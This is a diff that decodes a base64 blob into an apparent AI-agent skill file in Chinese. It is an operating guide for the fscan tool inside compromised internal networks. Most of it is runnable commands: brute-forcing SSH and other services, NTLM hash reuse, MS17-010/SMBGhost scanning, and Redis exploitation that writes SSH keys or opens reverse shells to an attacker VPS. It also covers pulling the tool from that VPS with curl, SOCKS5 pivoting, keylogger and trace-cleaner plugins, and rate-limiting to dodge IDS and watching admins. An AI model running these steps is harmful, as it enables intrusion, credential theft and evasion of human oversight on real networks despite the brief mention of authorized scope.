@@ -1,1 +1,216 @@
-LS0tCm5hbWU6IGZzY2FuLWludHJhbmV0CmRlc2NyaXB0aW9uOiBmc2NhbiB2Mi4yLjEg5YaF572R57u85ZCI5omr5o+P77ya5a2Y5rS75o6i5rWL44CB56uv5Y+jL+acjeWKoeivhuWIq+OAgTI4IOexu+W8seWPo+S7pOeIhuegtOOAgeacquaOiOadg+iuv+mXruS4jumrmOWNsea8j+a0nu+8iE1TMTctMDEwL1NNQkdob3N077yJ44CBUmVkaXMg5Yip55So5LiOIFNPQ0tTNSDpmqfpgZMKd2hlblRvVXNlOiDov5vlhaXlhoXnvZHvvIjot7Pmnb/mnLovV2ViU2hlbGwvc29ja3M1IOmap+mBk++8ieWQjuW/q+mAn+mTuuW8gOi1hOS6p+mdouOAgeaJvuW8seWPo+S7pOS4juacquaOiOadg+OAgeaKiuWPr+i+vuaAp+WPmOaIkOWPr+aJk+eCuQpyb2xlOiBpbnRlcm5hbAplbmFibGVkOiB0cnVlCi0tLQoKIyBmc2Nhbu+8iOWGhee9kee7vOWQiOaJq+aPj+S4juW8seWPo+S7pC/mvI/mtJ7vvIkKCmBmc2NhbmAgPSAqKuW5v+W6puS8mOWFiOeahOWGhee9keaZruafpSoq77ya5LiA5q61IEMg5q615Lii6L+b5Y6777yM5Yeg5YiG6ZKf5YaF57uZ5Ye65a2Y5rS75Li75py644CB5byA5pS+56uv5Y+j44CB5pyN5Yqh5oyH57q544CBV2ViIOagh+mimOOAgQrlvLHlj6Pku6TjgIHmnKrmjojmnYPorr/pl67jgIHpq5jljbHmvI/mtJ7jgIIqKuWZquWjsOWkpyoq77yM5Y+q6YCC5ZCI5YaF572R77yI5a+55LqS6IGU572R55uu5qCH55So5aSW6YOo5omr5o+P5oqA6IO977yJ44CCCgojIyDkuI4gZ29nbyDnmoTliIblt6UKCnwgfCBmc2NhbiB8IGdvZ28gfAp8IC0tLSB8IC0tLSB8IC0tLSB8Cnwg5a6a5L2NIHwg57u85ZCI5pmu5p+lICsg54iG56C0ICsg5Yip55SoIHwg6auY5oCn6IO95rWL57uYICsg5oyH57q5ICsg5L+h5oGv5o+Q5Y+WIHwKfCDlmarlo7AgfCDlpKfvvIjpu5jorqQgNjAwIOe6v+eoiyArIOeIhuegtCArIFBPQ++8iSB8IOWPr+aOp++8iGAtLW9wc2VjYOOAgee6v+eoiy/otoXml7boh6rosIPvvIkgfAp8IOWFiOeUqOWTquS4qiB8IOebruagh+aYjuehruOAgeimgeW/q+mAn+aJvuW8seWPo+S7pOS4jua0niB8IOWkp+e9keauteWFiOmTuumdouOAgeimgeaMh+e6ueWSjCB0aXRsZSB8CgoqKuaOqOiNkOmhuuW6jyoq77ya5YWIIGBnb2dvYCDpk7rpnaLmi7/otYTkuqfmuIXljZUg4oaSIOWGjSBgZnNjYW5gIOWvueehruiupOWtmOa0u+eahOebruagh+WBmuWumuWQkeeIhuegtOS4jua8j+a0nuOAggoKIyMg5LqM6L+b5Yi2CgpgYGAK5pys5py6IDogJERTSF9IT01FL3JlZHRlYW0vdG9vbGtpdC9mc2Nhbi9mc2NhbiAgICAgICAgICDvvIh2Mi4yLjHvvIzlkKvmnKzlnLDmj5Lku7bvvIkKICAgICAgICREU0hfSE9NRS9yZWR0ZWFtL3Rvb2xraXQvZnNjYW4vZnNjYW5fd2luZG93c194NjQuZXhlCiAgICAgICAkRFNIX0hPTUUvcmVkdGVhbS90b29sa2l0L2ZzY2FuL2ZzY2FuX2xpbnV4X2FybTY0ClZQUyAgOiBodHRwOi8vPOS9oOeahFZQU19JUD46OTEwMC9mc2NhbiAgICAgICAgICAgICAgICAgICAgIO+8iOaKgOiDvSB2cHMtcmV2ZXJzZS1zaGVsbCDnmoTovb3ojbfnm67lvZXvvIkKYGBgCgrlronoo4XohJrmnKzlj6rkuIvovb0gbGludXgvYW1kNjQg55qEIGBmc2NhbmDjgIJXaW5kb3dzIOS4jiBBUk0g5paH5Lu26ZyA6Ieq6KGM6KGl5LiK77yb5b2T5YmN5bmz5Y+w5Y+q55So5LiK6Z2i55qE5Li75paH5Lu244CCCgoqKuS8oOWIsOi3s+adv+acui/nm67moIcqKu+8iOWGhee9keaJq+aPj+W/hemhu+WcqOiDveWIsOi+vuWGhee9keeahOS9jee9ruaJp+ihjO+8ie+8mgoKYGBgYmFzaAojIOi3s+adv+acuuS4iuebtOaOpeS4i+i9ve+8iFZQUyDotbfovb3ojbfmnI3liqHvvJp+Ly5kc2gvcmVkdGVhbS90b29sa2l0L3Zwcy92cHMuc2ggc2VydmUgOTEwMO+8iQpjdXJsIC1vIGZzY2FuIGh0dHA6Ly885L2g55qEVlBTX0lQPjo5MTAwL2ZzY2FuICYmIGNobW9kICt4IGZzY2FuCiMg5oiW5LuO5pys5py657uPIHNoZWxscyDkuIrkvKAKYGBgCgojIyDnuqrlvovvvIjlhYjnnIvov5nmnaHvvIkKCjEuICoq6IyD5Zu0KirvvJrlj6rnlKjmjojmnYPmuIXljZXlhoXnmoTnvZHmrrXvvJvnlKggYC1laC8tZWhmYCDmmL7lvI/mjpLpmaTlip7lhaznvZHjgIHmiZPljbDmnLrjgIHlt6XmjqfjgIHkupHlhYPmlbDmja7vvIgxNjkuMjU0LjE2OS4yNTTvvInjgIIKMi4gKirliKvmiZPltKnorr7lpIcqKu+8mum7mOiupCBgLXQgNjAwYCDlr7nogIHorr7lpIcv5bel5o6n5b6I5Y2x6Zmp44CC5YaF572R5YWI55SoIGAtdCAxMDAgLXRpbWUgM2DvvIznoa7orqTorr7lpIfmiZvlvpfkvY/lho3liqDjgIIKMy4gKirlhYjml6DniIbnoLTlho3niIbnoLQqKu+8muesrOS4gOi9riBgLW5vYnIgLW5vcG9jYCDlj6rlgZrotYTkuqfpnaLvvJvnoa7orqTnm67moIfph43opoHmgKflkozmjojmnYPlkI7vvIznrKzkuozova7lho3mlL7lvIDjgIIKNC4gKirpgb/lvIDonJznvZAvSURTKirvvJpgLXJhdGVgIOmZkOmAn+OAgWAtbWF4cGt0c2Ag6ZmQ6YeP77yb566h55CG5ZGY5Y+v6IO95Zyo55yL552A44CCCjUuICoqRE5TTG9nIOWkluW4pioq77yaYC1kbnMgLWRvbWFpbiA85L2g55qEZG5zbG9n5Z+f5ZCNPmDvvIzliKvnlKjlhazlhbEgRE5TTG9nIOS8oOaVj+aEn+aVsOaNruOAggoKIyMg5qCH5YeG5L2c5Lia5rWB56iL77yIU09Q77yJCgpgYGBiYXNoCiMgMCkg56Gu6K6k6Ieq5bex5Zyo5ZOq44CB6IO95Yiw5ZOqCmlwIGE7IGlwIHJvdXRlCgojIDEpIOWtmOa0u+aZruafpe+8iOacgOW/q++8jOWFiOWciOWumua0u+S6uu+8iQouL2ZzY2FuIC1oIDEwLjAuMC4wLzI0IC1tIGljbXAgLW8gYWxpdmUudHh0IC1ub2NvbG9yCgojIDIpIOi1hOS6p+mdou+8iOS4jeeIhuegtOOAgeS4jeaJkyBQT0PvvIzmnIDlronpnZnvvIkKLi9mc2NhbiAtaCAxMC4wLjAuMC8yNCAtbnAgLW5vYnIgLW5vcG9jIC10IDEwMCAtdGltZSAzIC1vIGFzc2V0cy50eHQKCiMgMykgV2ViIOS8mOWFiO+8muaKiiBhc3NldHMudHh0IOmHjOeahCB3ZWIg56uv5Y+j5Lqk57uZ5oiq5Zu+L+aMh+e6ueeOr+iKggouL2ZzY2FuIC1oIDEwLjAuMC4wLzI0IC1wIDgwLDQ0Myw4MDgwLDgwMDAsODg4OCw5MDAwLDcwMDEsOTA5MCAtbm9iciAtbm9wb2MgLW5vY29sb3IKCiMgNCkg5a6a5ZCR54iG56C077yI5o6I5p2D56Gu6K6k5ZCO77yJCi4vZnNjYW4gLWggMTAuMC4wLjUgLW0gc3NoIC11c2VyIHJvb3QgLXB3ZGYgL3RtcC9wYXNzLnR4dCAtdCA1CgojIDUpIOmrmOWNsea8j+a0nuS4juacquaOiOadgwouL2ZzY2FuIC1oIDEwLjAuMC4wLzI0IC1tIG1zMTcwMTAsc21iZ2hvc3QgLW5vYnIKLi9mc2NhbiAtaCAxMC4wLjAuMC8yNCAtcCA2Mzc5LDI3MDE3LDkyMDAsMTEyMTEsMjE4MSAtbm9iciAtbm9wb2MKYGBgCgojIyDlj4LmlbDpgJ/mn6XvvIjlrp7mtYsgdjIuMi4xIGAtaGVscGDvvIkKCioq55uu5qCHKioKYGBgCi1oICA8SVB8Q0lEUnzmlofku7Z85Z+f5ZCNPiAgIOebruagh++8iElQIOauteaWh+S7tuS5n+WQg++8iQotaGYgPGZpbGU+ICAgICAgICAgICAgICAgIOS4u+acuuaWh+S7tiAgICAgICAgLWVoLy1laGYgIOaOkumZpOS4u+acui/mjpLpmaTmlofku7YKLXUgIDxVUkw+ICAtdWYgPGZpbGU+ICAgICDljZUgVVJMIC8gVVJMIOaWh+S7tiAgICAgLWRvbWFpbiA85Z+f5ZCNPgpgYGAKCioq56uv5Y+j5LiO5a2Y5rS7KioKYGBgCi1wICAyMSwyMiw4MCw0NDMsMzMwNiw2Mzc5LDEwMDAwLTEwMTAwICAgIOerr+WPo++8iOm7mOiupOWGhee9rue6piAxNTAg5Liq5bi455So56uv5Y+j77yJCi1wZiA8ZmlsZT4gIOerr+WPo+aWh+S7tiAgICAgICAgLWVwIOaOkumZpOerr+WPowotbnAgICAgICAgICDnpoHnlKggcGluZyDmjqLmtYvvvIjlj6rmiavnq6/lj6PvvIzlv6vvvIkgICAgICAtYW8gIOS7heWtmOa0u+aOoua1iwotbnNwICAgICAgICDnpoHnlKjnvZHmrrXpooTnrZvvvIjlpKfnvZHmrrXmj5DpgJ/vvIkgICAgICAgICAgLW50cCDnpoHnlKggVENQIOihpeWFheaOoua1iwpgYGAKCioq5qih5byPKioKYGBgCi1tIGFsbCAgICAgICAg6buY6K6k5YWo5rWB56iL77yI5ZCr54iG56C0K1BPQ++8iQotbSBpY21wICAgICAgIOS7heWtmOa0uwotbSA85o+S5Lu2PiAgICAg5Y+q6LeR5oyH5a6a5pyN5Yqh5o+S5Lu277yM5L6L5aaCIC1tIHNzaCAvIC1tIHJlZGlzIC8gLW0gc21iMiAvIC1tIG1zMTcwMTAgLyAtbSBuZXRiaW9zCi1ub2JyICAgICAgICAg56aB54iG56C0ICAgLW5vcG9jIOemgSBQT0MgICAtbm9yZWRpcyDnpoEgUmVkaXMg5Yip55SoCmBgYAoKKirlubblj5HkuI7oioLmtYEqKu+8iE9QU0VDIOWFs+mUru+8iQpgYGAKLXQgNjAwICAgICAgIOerr+WPo+aJq+aPj+e6v+eoiyAgICAgICAgLXRpbWUgMyAgIOerr+WPo+i2heaXtijnp5IpCi1tdCAyMCAgICAgICDmqKHlnZfnur/nqIsgICAgICAgICAgICAtd3QgNSAgICAgV2ViIOi2heaXtgotZ3QgMCAgICAgICAg5YWo5bGA6LaF5pe2KOenkikgICAgICAgIC1yZXRyeSAzICDph43or5XmrKHmlbAKLXJhdGUgMCAgICAgIOavj+WIhumSn+acgOWkp+WPkeWMheaVsCgwPeS4jemZkCkgICAtbWF4cGt0cyAwICDmgLvlj5HljIXkuIrpmZAKLW51bSAyMCAgICAgIFBPQyDlubblj5EgICAgICAgICAgICAtaWNtcC1yYXRlIDAuMSAgSUNNUCDpgJ/njocKYGBgCgoqKuWHreaNru+8iOeIhuegtO+8iSoqCmBgYAotdXNlci8tcHdkICAgICAg5Y2V57uE6LSm5Y+35a+G56CBICAgICAgICAgIC11c2VyZi8tcHdkZiAg5a2X5YW45paH5Lu2Ci11cGYgICAgICAgICAgICDnlKjmiLflkI065a+G56CBIOWvueaWh+S7tiAgICAgLXVzZXJhLy1wd2RhICDov73liqDlpJrkuKrvvIjpgJflj7cv56m65qC85YiG6ZqU77yJCi1oYXNoLy1oYXNoZiAgICBOVExNIEhhc2gg56Kw5pKeICAgICAgICAtc3Noa2V5ICAgICAgIOengemSpeeZu+W9lQpgYGAKCioq5Yip55So77yI5ou/5Yiw5bCx55So77yM5rOo5oSP5o6I5p2D6L6555WM77yJKioKYGBgCi1yZiA8cHVia2V5PiAgICAgICAgUmVkaXMg5YaZ5YWs6ZKl77yI5YaZIGF1dGhvcml6ZWRfa2V5cyDmi78gU1NI77yJCi1ycyAgICAgICAgICAgICAgICBSZWRpcyBTaGVsbCAgICAgICAgLXJ3Yy8tcndmLy1yd3AgIFJlZGlzIOWGmeWFpeWGheWuuS/mlofku7Yv6Lev5b6ECi1yc2ggPGlwOnBvcnQ+ICAgICDlj43lvLkgU2hlbGwg5Yiw5oyH5a6a5Zyw5Z2A77yI6YWN5ZCI5oqA6IO9IHZwcy1yZXZlcnNlLXNoZWxs77yJCi1zYyA8c2hlbGxjb2RlPiAgICBNUzE3LTAxMCBTaGVsbENvZGUKLWxvY2FsIDxwbHVnaW4+ICAgIOacrOacuuaPkuS7tu+8mnN5c3RlbWluZm8gLyBrZXlsb2dnZXIgLyBjbGVhbmVyIOetie+8iOWcqOi3s+adv+acuuS4iui3ke+8iQotc3RhcnQtc29ja3M1IDEwODAg5Zyo6Lez5p2/5py65LiK5byAIFNPQ0tTNSDmnI3liqHvvIzmiorlhoXnvZHmmrTpnLLnu5nmnKzmnLoKLWZzaC1wb3J0IDQ0NDQgICAgIOato+WQkSBTaGVsbCDmnI3liqHnq6/lj6MKYGBgCgoqKuS7o+eQhu+8iOaJk+map+mBk+WQjueahOaguOW/g+eUqOazle+8iSoqCmBgYAotc29ja3M1IDEyNy4wLjAuMToxMDgwICAgICAgICAgICAgICAgICDotbAgU09DS1M177yIc3VvNSAvIHNzaCAtRCAvIGZycCDpg73ooYzvvIkKLXNvY2tzNSBzb2NrczU6Ly91c2VyOnBhc3NAMTI3LjAuMC4xOjEwODAKLXByb3h5IGh0dHA6Ly8xMjcuMC4wLjE6ODA4MCAgICAgICAgICAg6LWwIEhUVFAg5Luj55CGCmBgYAoKKirovpPlh7oqKgpgYGAKLW8gcmVzdWx0LnR4dCAgICDovpPlh7rmlofku7YgICAgICAgIC1mIHR4dHxqc29ufGNzdiAgIOagvOW8jwotbm8gICAgICAgICAgICAgIOS4jeS/neWtmOe7k+aenCAgICAgIC1zaWxlbnQgIOmdmem7mCAgICAgLW5vY29sb3IvLW5vcGcgIOWFs+minOiJsi/ov5vluqbmnaEKLWxhbmcgemh8ZW4gICAgICDor63oqIAgICAgICAgICAgICAtbG9nICJiYXNlLGluZm8sc3VjY2VzcyIgICDml6Xlv5fnuqfliKsKLWRucyAgICAgICAgICAgICDorrDlvZUgRE5TIOaXpeW/l++8iOmFjeWQiCAtZG9tYWluIOWBmuWkluW4puajgOa1i++8iQotcGVyZiAgICAgICAgICAgIOi+k+WHuuaAp+iDvee7n+iuoSBKU09OCmBgYAoKIyMg5YWz6ZSu5Zy65pmvCgojIyMgMS4g6YCa6L+H6Zqn6YGT5omT5YaF572R77yI5pyA5bi455So77yJCgpgYGBiYXNoCiMg5YmN5o+Q77ya5bey5pyJIHNvY2tzNe+8iOaKgOiDvSBzdW81LXR1bm5lbO+8jOaIliB2cHMtcmV2ZXJzZS1zaGVsbCDph4wgc3NoIC1E77yJCiMg5a6e5rWL6aqM6K+B6L+H77yaZnNjYW4gLXNvY2tzNSDkvJrmiormtYHph4/nnJ/mraPpgIHov5vpmqfpgZMKLi9mc2NhbiAtaCAxMC4wLjAuMC8yNCAtcCAyMiw4MCw0NDUsMzMwNiw2Mzc5IC1ucCAtbm9iciAtbm9wb2MgXAogICAgICAgIC1zb2NrczUgMTI3LjAuMC4xOjEwODAgLXQgNTAgLXRpbWUgNSAtbyBpbnRyYW5ldC50eHQKYGBgCgrms6jmhI/vvJrotbDku6PnkIbml7bnur/nqIvliKvlvIDlpKrlpKfvvIjpmqfpgZPmnKzouqvmmK/nk7bpoojvvInvvIxgLXQgNTBgIOW3puWPs+i2s+Wkn+OAggoKIyMjIDIuIOWcqOi3s+adv+acuuS4iuW8gOmap+mBk+e7meacrOacuueUqAoK6Lez5p2/5py65LiK5omn6KGM77yI5oqK5YaF572RIDEwIOauteaatOmcsuWIsCBWUFMg55qEIDkxMDAg56uv5Y+j77yM5YaNIHNzaCDmnKzlnLDovazlj5Hlm57mnaXvvInvvJoKCmBgYGJhc2gKLi9mc2NhbiAtc3RhcnQtc29ja3M1IDEwODAgICAgICAjIOi3s+adv+acujoxMDgwIOWPmOaIkCBTT0NLUzUKIyBWUFMg5LiK5Y+N5ZCR6Zqn6YGT77yac3NoIC1SIDkyMDA6MTI3LjAuMC4xOjEwODAgdWJ1bnR1QDzkvaDnmoRWUFNfSVA+CiMg5pys5py677yac3NoIC1MIDEwODA6MTI3LjAuMC4xOjkyMDAgdWJ1bnR1QDzkvaDnmoRWUFNfSVA+CiMg5LmL5ZCO5omA5pyJ5bel5YW36YO96IO9IC1zb2NrczUgMTI3LjAuMC4xOjEwODAKYGBgCgojIyMgMy4g5ou/IFJlZGlzIOebtOaOpeimgeadg+mZkAoKYGBgYmFzaAouL2ZzY2FuIC1oIDEwLjAuMC41IC1wIDYzNzkgLW0gcmVkaXMgLXJmIH4vLnNzaC9pZF9yc2EucHViICAgICAjIOWGmeWFrOmSpSDihpIgc3NoIOS4iuWOuwouL2ZzY2FuIC1oIDEwLjAuMC41IC1wIDYzNzkgLXJzICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgUmVkaXMgU2hlbGwKLi9mc2NhbiAtaCAxMC4wLjAuNSAtcCA2Mzc5IC1yc2ggPOS9oOeahFZQU19JUD46OTAwMCAgICAgICAgICAgICAgIyDlj43lvLnliLAgVlBTIOebkeWQrApgYGAKCiMjIyA0LiDokL3liLDmnI3liqHlmajkuIrkuYvlkI4KCmBgYGJhc2gKLi9mc2NhbiAtbG9jYWwgc3lzdGVtaW5mbyAgICAgICAgIyDns7vnu5/kv6Hmga/jgIHnjq/looPlj5jph4/jgIHln5/mjqfjgIHnvZHljaEKLi9mc2NhbiAtbG9jYWwga2V5bG9nZ2VyICAgICAgICAgIyDplK7nm5jorrDlvZXvvIgta2V5bG9nLW91dHB1dCDmjIflrprovpPlh7rvvIkKLi9mc2NhbiAtbG9jYWwgY2xlYW5lciAgICAgICAgICAgIyDnl5Xov7nmuIXnkIYKYGBgCgojIyDnu5PmnpzokL3lupPvvIjlv4XpobvlgZrvvIkKCmZzY2FuIOeahCB0eHQg6L6T5Ye65piv5YiG5q6155qE77yM6Kej5p6Q5ZCO6YCQ5p2h5YWl5bqT77yaCgpgYGBiYXNoCiMg5q+P5Y+w5a2Y5rS75Li75py6CnJlZHRlYW1fYXNzZXRfYWRkICB7IGVuZ2FnZW1lbnQsIGlwLCBzb3VyY2U6ICJmc2NhbiIsIHRhZ3M6IFsiaW50ZXJuYWwiXSB9CiMg5q+P5Liq5byA5pS+56uv5Y+jL+acjeWKoQpyZWR0ZWFtX2Fzc2V0X2FkZCAgeyBlbmdhZ2VtZW50LCBpcCwgcG9ydCwgc2VydmljZSwgYmFubmVyIH0gICAjIOaIliBhc3NldF9saW5rIOWFs+iBlAojIOeIhuegtC/mnKrmjojmnYPmiJDlip/nmoTlh63mja7kuI7orr/pl64KcmVkdGVhbV9jcmVkZW50aWFsX2FkZCB7IGVuZ2FnZW1lbnQsIGhvc3QsIHVzZXJuYW1lLCBzZWNyZXRfdHlwZSwgc2VjcmV0X3JlZjogInJ1bnMvZnNjYW4tPOautT4udHh0IiB9CnJlZHRlYW1fYWNjZXNzX2FkZCAgICAgeyBlbmdhZ2VtZW50LCBob3N0LCB1c2VybmFtZSwgbWV0aG9kOiAic3NoIiwgcHJpdmlsZWdlLCBzZXNzaW9uX3JlZiB9CiMg56Gu6K6k55qE5ryP5rSe77yI5b+F6aG76YWNIGh0dHBfZXZpZGVuY2Ug5oiW562J5Lu36K+B5o2u77yJCnJlZHRlYW1fdnVsbl9hZGQgICB7IGVuZ2FnZW1lbnQsIHRhcmdldCwgbmFtZTogIlJlZGlzIOacquaOiOadg+iuv+mXriIsIHNldmVyaXR5OiAiaGlnaCIsIGV2aWRlbmNlX3JlZiB9CmBgYAoKKirnuqrlvosqKu+8mmAtb2Ag55qE6L6T5Ye65paH5Lu25piv6K+B5o2u77yM5ou35ZueIGBydW5zL2DvvJvkuI3opoHlj6rlnKjnu4jnq6/ph4znnIvkuIDnnLzlsLHnrpfmlbDjgIIKCiMjIOaOkumanAoKfCDnjrDosaEgfCDlpITnkIYgfAp8IC0tLSB8IC0tLSB8Cnwg5omr5LiN5YqoL+aegeaFoiB8IOWOu+aOiSBgLW5wYOOAgemZjSBgLXRg44CB5YqgIGAtdGltZWDvvJvlpKfnvZHmrrXlhYggYC1tIGljbXBgIOWciOa0u+S6uiB8Cnwg5YWo5piv5YGH5byA5pS+IHwg5Lit6Ze05pyJ6Ziy54Gr5aKZL+i0n+i9veWdh+ihoeWbniBTWU4tQUNL77yM55SoIGAtdGltZWAg6LCD5aSnICsgYC1yZXRyeWAg5aSN5qC4IHwKfCBJQ01QIOWksei0pSB8IOmcgOimgSByb290L2BDQVBfTkVUX1JBV2DvvJvnlKggYHN1ZG8gLi9mc2NhbiAtbSBpY21wYO+8jOaIluaUueeUqCBgLW5wYCDlj6rmiavnq6/lj6MgfAp8IOeIhuegtOiiq+mUgSB8IOWFiOeUqCBgLXVzZXJhYCDlsJHph4/or5XvvIznoa7orqTml6DplIHlrprnrZbnlaXvvIjln5/otKblj7flsKTlhbbljbHpmanvvIkgfAp8IOS4reaWh+S5seeggSB8IGAtbGFuZyBlbmAg5oiWIGBleHBvcnQgTEFORz16aF9DTi5VVEYtOGAgfAp8IOaDs+abtOWuiemdmSB8IGAtbm9iciAtbm9wb2MgLW5vY29sb3IgLW5vcGcgLXQgNTAgLXJhdGUgNjAwMGDvvIzlv4XopoHml7YgYC1zaWxlbnRgIHwKCiMjIOebuOWFs+aKgOiDvQoKLSBgZ29nby1pbnRyYW5ldGDvvJrlhYjnlKjlroPpk7rpnaIKLSBgc3VvNS10dW5uZWxg77yaV2ViU2hlbGwg4oaSIFNPQ0tTNe+8jOe7mSBmc2NhbiDmj5DkvpsgYC1zb2NrczVgIOWFpeWPowotIGB2cHMtcmV2ZXJzZS1zaGVsbGDvvJpgLXJzaGAg55qE6JC95Zyw56uv44CB6L296I235oqV6YCSCi0gYHdlYnNoZWxsLXRvb2xraXRg77ya5ou/5YiwIFdlYlNoZWxsIOWQjueahOeuoeeQhgo=
+---
+name: fscan-intranet
+description: fscan v2.2.1 内网综合扫描：存活探测、端口/服务识别、28 类弱口令爆破、未授权访问与高危漏洞（MS17-010/SMBGhost）、Redis 利用与 SOCKS5 隧道
+whenToUse: 进入内网（跳板机/WebShell/socks5 隧道）后快速铺开资产面、找弱口令与未授权、把可达性变成可打点
+role: internal
+enabled: true
+---
+
+# fscan（内网综合扫描与弱口令/漏洞）
+
+`fscan` = **广度优先的内网普查**：一段 C 段丢进去，几分钟内给出存活主机、开放端口、服务指纹、Web 标题、
+弱口令、未授权访问、高危漏洞。**噪声大**，只适合内网（对互联网目标用外部扫描技能）。
+
+## 与 gogo 的分工
+
+| | fscan | gogo |
+| --- | --- | --- |
+| 定位 | 综合普查 + 爆破 + 利用 | 高性能测绘 + 指纹 + 信息提取 |
+| 噪声 | 大（默认 600 线程 + 爆破 + POC） | 可控（`--opsec`、线程/超时自调） |
+| 先用哪个 | 目标明确、要快速找弱口令与洞 | 大网段先铺面、要指纹和 title |
+
+**推荐顺序**：先 `gogo` 铺面拿资产清单 → 再 `fscan` 对确认存活的目标做定向爆破与漏洞。
+
+## 二进制
+
+```
+本机 : $DSH_HOME/redteam/toolkit/fscan/fscan          （v2.2.1，含本地插件）
+       $DSH_HOME/redteam/toolkit/fscan/fscan_windows_x64.exe
+       $DSH_HOME/redteam/toolkit/fscan/fscan_linux_arm64
+VPS  : http://<你的VPS_IP>:9100/fscan                     （技能 vps-reverse-shell 的载荷目录）
+```
+
+安装脚本只下载 linux/amd64 的 `fscan`。Windows 与 ARM 文件需自行补上；当前平台只用上面的主文件。
+
+**传到跳板机/目标**（内网扫描必须在能到达内网的位置执行）：
+
+```bash
+# 跳板机上直接下载（VPS 起载荷服务：~/.dsh/redteam/toolkit/vps/vps.sh serve 9100）
+curl -o fscan http://<你的VPS_IP>:9100/fscan && chmod +x fscan
+# 或从本机经 shells 上传
+```
+
+## 纪律（先看这条）
+
+1. **范围**：只用授权清单内的网段；用 `-eh/-ehf` 显式排除办公网、打印机、工控、云元数据（169.254.169.254）。
+2. **别打崩设备**：默认 `-t 600` 对老设备/工控很危险。内网先用 `-t 100 -time 3`，确认设备扛得住再加。
+3. **先无爆破再爆破**：第一轮 `-nobr -nopoc` 只做资产面；确认目标重要性和授权后，第二轮再放开。
+4. **避开蜜罐/IDS**：`-rate` 限速、`-maxpkts` 限量；管理员可能在看着。
+5. **DNSLog 外带**：`-dns -domain <你的dnslog域名>`，别用公共 DNSLog 传敏感数据。
+
+## 标准作业流程（SOP）
+
+```bash
+# 0) 确认自己在哪、能到哪
+ip a; ip route
+
+# 1) 存活普查（最快，先圈定活人）
+./fscan -h 10.0.0.0/24 -m icmp -o alive.txt -nocolor
+
+# 2) 资产面（不爆破、不打 POC，最安静）
+./fscan -h 10.0.0.0/24 -np -nobr -nopoc -t 100 -time 3 -o assets.txt
+
+# 3) Web 优先：把 assets.txt 里的 web 端口交给截图/指纹环节
+./fscan -h 10.0.0.0/24 -p 80,443,8080,8000,8888,9000,7001,9090 -nobr -nopoc -nocolor
+
+# 4) 定向爆破（授权确认后）
+./fscan -h 10.0.0.5 -m ssh -user root -pwdf /tmp/pass.txt -t 5
+
+# 5) 高危漏洞与未授权
+./fscan -h 10.0.0.0/24 -m ms17010,smbghost -nobr
+./fscan -h 10.0.0.0/24 -p 6379,27017,9200,11211,2181 -nobr -nopoc
+```
+
+## 参数速查（实测 v2.2.1 `-help`）
+
+**目标**
+```
+-h  <IP|CIDR|文件|域名>   目标（IP 段文件也吃）
+-hf <file>                主机文件        -eh/-ehf  排除主机/排除文件
+-u  <URL>  -uf <file>     单 URL / URL 文件     -domain <域名>
+```
+
+**端口与存活**
+```
+-p  21,22,80,443,3306,6379,10000-10100    端口（默认内置约 150 个常用端口）
+-pf <file>  端口文件        -ep 排除端口
+-np         禁用 ping 探测（只扫端口，快）      -ao  仅存活探测
+-nsp        禁用网段预筛（大网段提速）          -ntp 禁用 TCP 补充探测
+```
+
+**模式**
+```
+-m all        默认全流程（含爆破+POC）
+-m icmp       仅存活
+-m <插件>     只跑指定服务插件，例如 -m ssh / -m redis / -m smb2 / -m ms17010 / -m netbios
+-nobr         禁爆破   -nopoc 禁 POC   -noredis 禁 Redis 利用
+```
+
+**并发与节流**（OPSEC 关键）
+```
+-t 600       端口扫描线程        -time 3   端口超时(秒)
+-mt 20       模块线程            -wt 5     Web 超时
+-gt 0        全局超时(秒)        -retry 3  重试次数
+-rate 0      每分钟最大发包数(0=不限)   -maxpkts 0  总发包上限
+-num 20      POC 并发            -icmp-rate 0.1  ICMP 速率
+```
+
+**凭据（爆破）**
+```
+-user/-pwd      单组账号密码          -userf/-pwdf  字典文件
+-upf            用户名:密码 对文件     -usera/-pwda  追加多个（逗号/空格分隔）
+-hash/-hashf    NTLM Hash 碰撞        -sshkey       私钥登录
+```
+
+**利用（拿到就用，注意授权边界）**
+```
+-rf <pubkey>        Redis 写公钥（写 authorized_keys 拿 SSH）
+-rs                Redis Shell        -rwc/-rwf/-rwp  Redis 写入内容/文件/路径
+-rsh <ip:port>     反弹 Shell 到指定地址（配合技能 vps-reverse-shell）
+-sc <shellcode>    MS17-010 ShellCode
+-local <plugin>    本机插件：systeminfo / keylogger / cleaner 等（在跳板机上跑）
+-start-socks5 1080 在跳板机上开 SOCKS5 服务，把内网暴露给本机
+-fsh-port 4444     正向 Shell 服务端口
+```
+
+**代理（打隧道后的核心用法）**
+```
+-socks5 127.0.0.1:1080                 走 SOCKS5（suo5 / ssh -D / frp 都行）
+-socks5 socks5://user:pass@127.0.0.1:1080
+-proxy http://127.0.0.1:8080           走 HTTP 代理
+```
+
+**输出**
+```
+-o result.txt    输出文件        -f txt|json|csv   格式
+-no              不保存结果      -silent  静默     -nocolor/-nopg  关颜色/进度条
+-lang zh|en      语言            -log "base,info,success"   日志级别
+-dns             记录 DNS 日志（配合 -domain 做外带检测）
+-perf            输出性能统计 JSON
+```
+
+## 关键场景
+
+### 1. 通过隧道打内网（最常用）
+
+```bash
+# 前提：已有 socks5（技能 suo5-tunnel，或 vps-reverse-shell 里 ssh -D）
+# 实测验证过：fscan -socks5 会把流量真正送进隧道
+./fscan -h 10.0.0.0/24 -p 22,80,445,3306,6379 -np -nobr -nopoc \
+        -socks5 127.0.0.1:1080 -t 50 -time 5 -o intranet.txt
+```
+
+注意：走代理时线程别开太大（隧道本身是瓶颈），`-t 50` 左右足够。
+
+### 2. 在跳板机上开隧道给本机用
+
+跳板机上执行（把内网 10 段暴露到 VPS 的 9100 端口，再 ssh 本地转发回来）：
+
+```bash
+./fscan -start-socks5 1080      # 跳板机:1080 变成 SOCKS5
+# VPS 上反向隧道：ssh -R 9200:127.0.0.1:1080 ubuntu@<你的VPS_IP>
+# 本机：ssh -L 1080:127.0.0.1:9200 ubuntu@<你的VPS_IP>
+# 之后所有工具都能 -socks5 127.0.0.1:1080
+```
+
+### 3. 拿 Redis 直接要权限
+
+```bash
+./fscan -h 10.0.0.5 -p 6379 -m redis -rf ~/.ssh/id_rsa.pub     # 写公钥 → ssh 上去
+./fscan -h 10.0.0.5 -p 6379 -rs                                  # Redis Shell
+./fscan -h 10.0.0.5 -p 6379 -rsh <你的VPS_IP>:9000              # 反弹到 VPS 监听
+```
+
+### 4. 落到服务器上之后
+
+```bash
+./fscan -local systeminfo        # 系统信息、环境变量、域控、网卡
